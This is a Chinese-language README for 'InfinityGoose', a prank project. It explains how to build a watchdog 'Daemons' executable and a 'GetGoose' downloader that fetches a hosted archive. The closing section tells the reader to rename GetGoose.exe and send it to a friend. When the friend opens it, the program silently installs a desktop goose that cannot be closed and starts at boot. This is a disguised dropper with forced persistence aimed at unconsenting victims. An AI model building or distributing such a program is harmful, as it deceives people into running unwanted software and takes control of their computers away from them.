# InfinityGoose
一个恶搞小程序，关不掉的桌面鹅

### 编译Daemons
Daemons 环境 .net core 3.1 （使用CoreRT静态编译，不需要runtime而且占内存很少）

进入Daemons项目根目录

```powershell
dotnet restore
dotnet publish -r win-x64 -c release
```
将Daemons编译后（.\bin\release\netcoreapp3.1\win-x64\publish\Daemons.exe）放入桌面鹅的根目录（DG.zip中）

注：DG.zip中已经存在

将DG.zip存在（服务器/网盘/对象存储）中，将下载链接保存下来

### 编译GetGoose

GetGoose 环境.net framework 4.7 (图方便，所有人电脑都支持)

修改Goose/Program.cs中的下载地址（DG.zip的下载链接）后编译，生成GetGoose.exe

### 迫害开始

接下来将GetGoose.exe改个名字发送给你的朋友

当他双击后会自动将桌面鹅下载到他的电脑，并且无法关闭，还会开机自启
